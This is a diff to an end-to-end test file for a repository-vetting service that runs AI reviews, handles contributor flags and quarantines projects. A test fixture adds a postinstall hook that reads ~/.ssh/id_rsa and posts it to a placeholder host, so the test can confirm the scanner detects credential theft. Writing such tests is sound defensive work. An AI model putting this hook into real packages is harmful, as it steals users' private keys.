@@ -2,6 +2,8 @@
 // pass refreshes the queue, acquires the exact Git and template bytes,
 // inspects them, runs the Surplus primary review and, only for an ambiguous
 // result, the Surplus specialist, retains the evidence and publishes once.
+// The malicious-detection and two-flag reinstatement scenarios come from
+// the closed duplicate #1092.
 // Every route is a real handler on the real migrations with local workerd
 // R2. The Git API, GitHub identity and Surplus provider are local fixtures
 // that answer exactly as those services do; no real provider or key is used.
@@ -14,11 +16,19 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { CloudflareProjectPersistence } from "../backend/projects/cloudflare-persistence";
 import { handleProjectApi } from "../backend/projects/handler";
+import { flaggerAuthority } from "../backend/projects/setup";
+import { githubFlaggerStanding } from "../backend/vetting/flagger-standing";
+import {
+  handleProjectFlagsApi,
+  ProjectFlagStore,
+} from "../backend/vetting/flags";
 import {
   handleVettingApi,
+  queueAutomaticScan,
   signedVettingRequest,
 } from "../backend/vetting/handler";
 import { CloudflareVettingPersistence } from "../backend/vetting/persistence";
+import { isScanResult } from "../backend/vetting/scan-result";
 import { applicationManifest } from "../tests/project-application-manifest";
 import { sqliteD1 } from "../tests/sqlite-d1";
 import { localVettingEvidence } from "../tests/vetting-evidence-fixture";
@@ -32,6 +42,14 @@ const ORIGIN = "https://slop.cash";
 const NOW = new Date("2026-10-18T12:00:00.000Z");
 const APPLICANT = { githubId: "900000002", githubLogin: "e2e-applicant" };
 const ADMIN = { githubId: "900000001", githubLogin: "e2e-admin" };
+const ALICE = { githubId: "900000010", githubLogin: "alice" };
+const BOB = { githubId: "900000011", githubLogin: "bob" };
+const ACTORS: Record<string, { githubId: string; githubLogin: string }> = {
+  applicant: APPLICANT,
+  admin: ADMIN,
+  alice: ALICE,
+  bob: BOB,
+};
 const digest = (value: string | Uint8Array) =>
   createHash("sha256").update(value).digest("hex");
 const templateText = "Follow the project rules and run the tests.\n";
@@ -61,10 +79,11 @@ const REPOSITORY_FILES: Record<string, string> = {
 };
 
 let root: string;
+let repository: string;
 let commitSha: string;
-let gitObjects: Map<string, { type: string; body: Buffer }>;
-let treeEntries: { path: string; mode: string; type: string; sha: string }[];
-let treeSha: string;
+let clock: Date;
+let sqlite: ReturnType<typeof sqliteD1>["sqlite"];
+let flags: ProjectFlagStore;
 let retained: Awaited<ReturnType<typeof localVettingEvidence>>;
 let projects: CloudflareProjectPersistence;
 let vetting: CloudflareVettingPersistence;
@@ -76,28 +95,28 @@ let ids = 0;
 let provider: {
   up: boolean;
   specialistUp: boolean;
-  primary: "no-findings" | "findings";
+  primary: "no-findings" | "findings" | "malicious-suspected";
+  /** False makes every evidence route answer 503. */
+  evidenceUp: boolean;
   calls: { path: string; model: string; authorization: string | null }[];
 };
 
-const git = (cwd: string, ...args: string[]) => {
+const git = (...args: string[]) => {
   const output = spawnSync("git", ["-c", "core.hooksPath=/dev/null", ...args], {
-    cwd,
+    cwd: repository,
   });
   if (output.status !== 0) throw new Error(output.stderr.toString());
   return output.stdout;
 };
 
-async function gitFixture() {
-  const repository = join(root, "git");
-  for (const [path, text] of Object.entries(REPOSITORY_FILES)) {
+/** Commits files to the fixture repository; the live pin follows it. */
+async function commit(files: Record<string, string>, message: string) {
+  for (const [path, text] of Object.entries(files)) {
     await mkdir(join(repository, path, ".."), { recursive: true });
     await writeFile(join(repository, path), text);
   }
-  git(repository, "init", "-q");
-  git(repository, "add", ".");
+  git("add", ".");
   git(
-    repository,
     "-c",
     "user.name=Fixture",
     "-c",
@@ -105,33 +124,13 @@ async function gitFixture() {
     "commit",
     "--no-gpg-sign",
     "-qm",
-    "Harmless fixture",
+    message,
   );
-  commitSha = git(repository, "rev-parse", "HEAD").toString().trim();
-  treeSha = git(repository, "rev-parse", "HEAD^{tree}").toString().trim();
-  treeEntries = git(repository, "ls-tree", "-r", "-t", "HEAD")
-    .toString()
-    .trim()
-    .split("\n")
-    .map((line) => {
-      const [meta, path] = line.split("\t");
-      const [mode, type, sha] = meta.split(" ");
-      return { path, mode, type, sha };
-    });
-  gitObjects = new Map(
-    treeEntries
-      .filter((entry) => entry.type === "blob")
-      .map((entry) => [
-        entry.sha,
-        {
-          type: "blob",
-          body: git(repository, "cat-file", "blob", entry.sha),
-        },
-      ]),
-  );
+  commitSha = git("rev-parse", "HEAD").toString().trim();
 }
 
 function review(items: { id: string }[], verdict: string) {
+  const risky = items.find((item) => item.id === "scripts/postinstall.js");
   return JSON.stringify({
     verdict,
     confidence: 0.9,
@@ -139,15 +138,18 @@ function review(items: { id: string }[], verdict: string) {
       SCAN_REVIEW_AREAS.map((area) => [area, "complete"]),
     ),
     findings:
-      verdict === "findings"
-        ? [
+      verdict === "no-findings"
+        ? []
+        : [
             {
-              severity: "medium",
-              summary: "Synthetic finding that needs a second opinion",
-              evidenceIds: [items[0].id],
+              severity:
+                verdict === "malicious-suspected" ? "critical" : "medium",
+              summary: risky
+                ? "The install hook reads an SSH key and posts it out"
+                : "Synthetic finding that needs a second opinion",
+              evidenceIds: [(risky ?? items[0]).id],
             },
-          ]
-        : [],
+          ],
   });
 }
 
@@ -210,16 +212,25 @@ const readLivePin = async () => ({ commitSha, templateSha256: TEMPLATE });
 const randomId = () =>
   `00000000-0000-4000-8000-${String(++ids).padStart(12, "0")}`;
 const actorOf = (request: Request) =>
-  ({ applicant: APPLICANT, admin: ADMIN })[
-    request.headers.get("x-test-actor") ?? ""
-  ] ?? null;
+  ACTORS[request.headers.get("x-test-actor") ?? ""] ?? null;
+const vettingDeps = () => ({
+  evidence: retained.evidence,
+  vetting,
+  flags,
+  projects,
+  resultPublicKeys,
+  livePin: readLivePin,
+  session: async () => null,
+  now: () => clock,
+  randomId,
+});
 
 function projectApi(request: Request) {
   return handleProjectApi(request, {
     persistence: projects,
     adminGithubIds: new Set([ADMIN.githubId]),
     moderatorGithubIds: new Set([ADMIN.githubId]),
-    now: () => NOW,
+    now: () => clock,
     randomId,
     sessionActor: async (value) => actorOf(value),
     repositoryControl: async () => ({ state: "matched", reason: "fixture" }),
@@ -244,6 +255,111 @@ function projectApi(request: Request) {
   }) as Promise<Response>;
 }
 
+/** The GitHub REST reads of acquisition and flag eligibility. */
+function github(url: URL): Response {
+  const path = url.pathname;
+  if (path === "/repos/example/open-registry")
+    return Response.json({
+      id: 123456789,
+      node_id: "R_example",
+      full_name: "example/open-registry",
+      private: false,
+    });
+  const object =
+    /^\/repos\/example\/open-registry\/git\/(commits|trees|blobs)\/([0-9a-f]{40})$/u.exec(
+      path,
+    );
+  if (object?.[1] === "commits")
+    return Response.json({
+      sha: object[2],
+      tree: { sha: git("rev-parse", `${object[2]}^{tree}`).toString().trim() },
+    });
+  if (object?.[1] === "trees")
+    return Response.json({
+      sha: object[2],
+      truncated: false,
+      tree: git("ls-tree", "-r", "-t", object[2])
+        .toString()
+        .split("\n")
+        .filter(Boolean)
+        .map((line) => {
+          const [meta, entryPath] = line.split("\t");
+          const [mode, type, sha] = meta.split(" ");
+          return { path: entryPath, mode, type, sha };
+        }),
+    });
+  if (object?.[1] === "blobs") {
+    const bytes = git("cat-file", "blob", object[2]);
+    return Response.json({
+      sha: object[2],
+      encoding: "base64",
+      size: bytes.length,
+      content: bytes.toString("base64"),
+    });
+  }
+  const user = /^\/user\/([0-9]+)$/u.exec(path)?.[1];
+  const actor = Object.values(ACTORS).find((entry) => entry.githubId === user);
+  if (actor)
+    return Response.json({
+      id: Number(actor.githubId),
+      login: actor.githubLogin,
+      node_id: `U_${actor.githubId}`,
+      type: "User",
+      created_at: "2020-01-01T00:00:00Z",
+    });
+  if (/^\/repos\/[^/]+\/[^/]+\/issues$/u.test(path)) {
+    const creator = Object.values(ACTORS).find(
+      (entry) => entry.githubLogin === url.searchParams.get("creator"),
+    );
+    return Response.json(
+      Array.from({ length: creator ? 2 : 0 }, (_, index) => ({
+        number: index + 1,
+        user: { id: Number(creator?.githubId) },
+        pull_request: { merged_at: "2026-09-01T00:00:00Z" },
+      })),
+    );
+  }
+  return new Response(null, { status: 404 });
+}
+
+const flagApi = (request: Request) =>
+  handleProjectFlagsApi(request, {
+    flags,
+    projects,
+    sessionActor: async (value) => actorOf(value),
+    flaggerStanding: githubFlaggerStanding({
+      fetch: async (url: string) => github(new URL(url)),
+      apiOrigin: "https://api.github.test",
+      registryRepositories: async () =>
+        (await projects.listProjects()).flatMap((entry) =>
+          entry.manifest.repositories.map((item) => item.id),
+        ),
+    }),
+    repositoryAuthority: async (manifest, actor) =>
+      flaggerAuthority(
+        {
+          state: "read",
+          access: {
+            installation: "installed",
+            installationId: 1,
+            permission: "read",
+            roleName: null,
+          },
+        },
+        actor,
+        manifest.repositories[0].id,
+      ),
+    moderatorGithubIds: [ADMIN.githubId],
+    queueFreshScan: (project) =>
+      queueAutomaticScan(
+        vettingDeps(),
+        project,
+        "Automatic fresh scan after two contributor flags paused the project",
+      ),
+    now: () => clock,
+    randomId,
+  }) as Promise<Response>;
+
 async function route(incoming: Request): Promise<Response> {
   const url = new URL(incoming.url);
   const host = incoming.headers.get("x-fixture-host");
@@ -253,35 +369,7 @@ async function route(incoming: Request): Promise<Response> {
     return path.endsWith("/src/render.mjs")
       ? new Response(rendererText)
       : new Response(null, { status: 404 });
-  if (host === "api.github.com") {
-    if (path === "/repos/example/open-registry")
-      return Response.json({
-        id: 123456789,
-        node_id: "R_example",
-        full_name: "example/open-registry",
-        private: false,
-      });
-    const git = /^\/repos\/example\/open-registry\/git\/(.+)$/u.exec(path)?.[1];
-    if (git === `commits/${commitSha}`)
-      return Response.json({ sha: commitSha, tree: { sha: treeSha } });
-    if (git === `trees/${treeSha}`)
-      return Response.json({
-        sha: treeSha,
-        truncated: false,
-        tree: treeEntries,
-      });
-    const blob = git?.startsWith("blobs/")
-      ? gitObjects.get(git.slice(6))
-      : undefined;
-    if (blob && git)
-      return Response.json({
-        sha: git.slice(6),
-        encoding: "base64",
-        size: blob.body.length,
-        content: blob.body.toString("base64"),
-      });
-    return new Response(null, { status: 404 });
-  }
+  if (host === "api.github.com") return github(url);
   const request = new Request(`${ORIGIN}${path}${url.search}`, incoming);
   if (path === "/skill-templates/index.json")
     return Response.json({
@@ -299,6 +387,8 @@ async function route(incoming: Request): Promise<Response> {
       acceptedRevisions: templateInputs.acceptedRevisions,
     });
   if (path.startsWith("/skill-templates/")) return new Response(templateText);
+  if (path.startsWith("/api/v1/vetting/evidence/") && !provider.evidenceUp)
+    return Response.json({ error: "evidence_unavailable" }, { status: 503 });
   if (path.startsWith("/api/v1/vetting/evidence/"))
     return (
       (await retained.evidence.handle(request)) ??
@@ -306,16 +396,8 @@ async function route(incoming: Request): Promise<Response> {
     );
   if (path.startsWith("/api/v1/vetting/"))
     return (
-      (await handleVettingApi(request, {
-        evidence: retained.evidence,
-        vetting,
-        projects,
-        resultPublicKeys,
-        livePin: readLivePin,
-        session: async () => null,
-        now: () => NOW,
-        randomId,
-      })) ?? new Response(null, { status: 404 })
+      (await handleVettingApi(request, vettingDeps())) ??
+      new Response(null, { status: 404 })
     );
   return (await projectApi(request)) ?? new Response(null, { status: 404 });
 }
@@ -343,15 +425,21 @@ const profile = (
 });
 
 beforeEach(async () => {
+  clock = NOW;
   root = await mkdtemp(join(tmpdir(), "slop-scan-service-"));
-  await gitFixture();
+  repository = join(root, "git");
+  await mkdir(repository);
+  git("init", "-q");
+  await commit(REPOSITORY_FILES, "Harmless fixture");
   const database = sqliteD1(
     readdirSync(new URL("../migrations", import.meta.url))
       .filter((name) => name.endsWith(".sql"))
       .sort(),
   );
+  sqlite = database.sqlite;
   projects = new CloudflareProjectPersistence(database.db);
-  retained = await localVettingEvidence(database.db, () => NOW);
+  flags = new ProjectFlagStore(database.db);
+  retained = await localVettingEvidence(database.db, () => clock);
   vetting = new CloudflareVettingPersistence(
     database.db,
     async (a) => a.result !== null && retained.evidence.retained(a.result),
@@ -367,13 +455,14 @@ beforeEach(async () => {
   retained.evidence.deps.signed = (request, maximum) =>
     signedVettingRequest(
       request,
-      { resultPublicKeys, now: () => NOW },
+      { resultPublicKeys, now: () => clock },
       maximum,
     );
   provider = {
     up: true,
     specialistUp: true,
     primary: "no-findings",
+    evidenceUp: true,
     calls: [],
   };
   server = Bun.serve({ port: 0, fetch: route });
@@ -381,7 +470,7 @@ beforeEach(async () => {
     connection: {
       origin: ORIGIN,
       ...pair,
-      now: () => NOW,
+      now: () => clock,
       fetch: ((input: string | URL | Request, init?: RequestInit) => {
         const url = new URL(String(input));
         return fetch(
@@ -468,6 +557,7 @@ test("a provider outage leaves the scan pending; the next pass clears the projec
       disposition: "clean",
       outcome: "accepted",
       specialist: false,
+      evidence: "retained",
     },
   ]);
   // One primary review through Surplus with the account key; no specialist.
@@ -498,6 +588,7 @@ test("an ambiguous primary review runs the Surplus specialist once before public
       disposition: "clean",
       outcome: "accepted",
       specialist: true,
+      evidence: "retained",
     },
   ]);
   expect(provider.calls.map((call) => [call.path, call.model])).toEqual([
@@ -524,4 +615,193 @@ test("a failed specialist is a service failure: nothing is published and the sca
   ]);
   expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
   expect(await readdir(config.journalDirectory)).toEqual([]);
+});
+
+const sessionRequest = (
+  method: string,
+  path: string,
+  actor: string,
+  body?: unknown,
+) =>
+  new Request(`${ORIGIN}/api/v1/${path}`, {
+    method,
+    headers: {
+      "x-test-actor": actor,
+      ...(body === undefined
+        ? {}
+        : { "content-type": "application/json", origin: ORIGIN }),
+    },
+    body: body === undefined ? undefined : JSON.stringify(body),
+  });
+const publicVetting = async () =>
+  (
+    await (
+      await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`))
+    ).json()
+  ).vetting;
+const flag = (actor: string) =>
+  flagApi(
+    sessionRequest("POST", "project-flags/open-registry", actor, {
+      category: "credential-theft",
+      evidence:
+        "scripts/postinstall.js reads ~/.ssh/id_rsa and posts it to a remote host",
+      evidenceUrl:
+        "https://github.com/example/open-registry/blob/main/scripts/postinstall.js",
+    }),
+  );
+const RISKY_FILES = {
+  "package.json": JSON.stringify({
+    name: "fixture",
+    scripts: { test: "bun test", postinstall: "node scripts/postinstall.js" },
+  }),
+  "scripts/postinstall.js":
+    "const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\nfetch('https://collector.invalid', { method: 'POST', body: key });\n",
+};
+
+test("a clean result is never published without its retained evidence; the next pass retries", async () => {
+  provider.evidenceUp = false;
+  const failed = await runScanPass(config);
+  const [{ assessmentId }] = failed.assessments;
+  expect(failed.assessments[0]).toEqual({
+    assessmentId,
+    state: "retry",
+    step: "evidence",
+  });
+  expect((await vetting.getAssessment(assessmentId))?.state).toBe("pending");
+  expect(await readdir(config.journalDirectory)).toEqual([]);
+
+  provider.evidenceUp = true;
+  clock = new Date(NOW.getTime() + 60_000);
+  expect((await runScanPass(config)).assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
+      disposition: "clean",
+      outcome: "accepted",
+      specialist: false,
+      evidence: "retained",
+    },
+  ]);
+  expect((await activate()).status).toBe(200);
+});
+
+test("an incomplete result is published although the evidence store fails, so the models are not called again", async () => {
+  // A committed binary keeps the scan incomplete and quarantined.
+  await commit({ "bin/tool.wasm": "\0asm\u0001\0\0\0" }, "Add a binary");
+  provider.evidenceUp = false;
+  const report = await runScanPass(config);
+  const [{ assessmentId }] = report.assessments;
+  expect(report.assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
+      disposition: "incomplete",
+      outcome: "accepted",
+      specialist: true,
+      evidence: "failed",
+    },
+  ]);
+  // A binary needs the specialist; each model runs once.
+  expect(provider.calls.map((call) => call.model)).toEqual([
+    "claude-opus-5.5",
+    "gpt-6.1-sol",
+  ]);
+  expect((await vetting.getAssessment(assessmentId))?.state).toBe("incomplete");
+  provider.calls = [];
+  expect((await runScanPass(config)).assessments).toEqual([]);
+  expect(provider.calls).toEqual([]);
+});
+
+test("malicious-code detection: risky new content is flagged, escalated to the specialist and kept quarantined", async () => {
+  await runScanPass(config);
+  expect((await activate()).status).toBe(200);
+
+  // A new commit adds an install hook that steals a key.
+  await commit(RISKY_FILES, "Add install hook");
+  expect((await publicVetting()).state).toBe("stale");
+  provider.primary = "malicious-suspected";
+  provider.calls = [];
+  clock = new Date(NOW.getTime() + 60_000);
+  const report = await runScanPass(config);
+  const [{ assessmentId }] = report.assessments;
+  expect(report.assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
+      disposition: "incomplete",
+      outcome: "accepted",
+      specialist: true,
+      evidence: "retained",
+    },
+  ]);
+  // The specialist runs only because the primary review was high risk.
+  expect(provider.calls.map((call) => call.model)).toEqual([
+    "claude-opus-5.5",
+    "gpt-6.1-sol",
+  ]);
+  const assessment = await vetting.getAssessment(assessmentId);
+  const result = assessment?.result;
+  if (!result || !isScanResult(result)) throw new Error("no bounded result");
+  expect(assessment?.state).toBe("incomplete");
+  expect(result.checks["credential-theft"]).toBe("flagged");
+  expect(result.primaryReview.risk).toBe("high");
+  expect(result.specialistReview).toMatchObject({
+    provider: "surplus",
+    model: "gpt-6.1-sol",
+  });
+  // A model label alone never bans: a moderator confirms malice.
+  expect(result.confirmation).toBeNull();
+  expect((await publicVetting()).state).toBe("quarantined");
+  expect(
+    sqlite
+      .query(
+        "SELECT kind, label FROM vetting_evidence_objects WHERE assessment_id = ? AND kind = 'trace'",
+      )
+      .all(assessmentId),
+  ).toEqual([{ kind: "trace", label: "Bounded scan report" }]);
+});
+
+test("a two-flag pause is reinstated automatically after the service's clean fresh scan", async () => {
+  await runScanPass(config);
+  expect((await activate()).status).toBe(200);
+
+  expect((await flag("alice")).status).toBe(201);
+  clock = new Date(NOW.getTime() + 60_000);
+  expect(await (await flag("bob")).json()).toMatchObject({
+    paused: true,
+    pausedByFlags: true,
+    freshScan: "queued",
+  });
+  expect(
+    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
+      .status,
+  ).toBe(410);
+
+  clock = new Date(NOW.getTime() + 120_000);
+  const report = await runScanPass(config);
+  const [{ assessmentId }] = report.assessments;
+  expect(report.assessments).toEqual([
+    {
+      assessmentId,
+      state: "published",
+      disposition: "clean",
+      outcome: "accepted",
+      specialist: false,
+      evidence: "retained",
+    },
+  ]);
+  const record = (await projects.listEnforcements())
+    .filter((entry) => entry.projectId === "open-registry")
+    .at(-1);
+  expect(record).toMatchObject({
+    action: "reinstate",
+    stateAfter: "clear",
+    actorRole: "vetting-service",
+    systemIssuer: { rule: "clean-fresh-scan-after-flags", assessmentId },
+  });
+  expect(
+    (await projectApi(new Request(`${ORIGIN}/api/v1/projects/open-registry`)))
+      .status,
+  ).toBe(200);
+  expect(await flags.activeFlags(clock)).toEqual([]);
 });
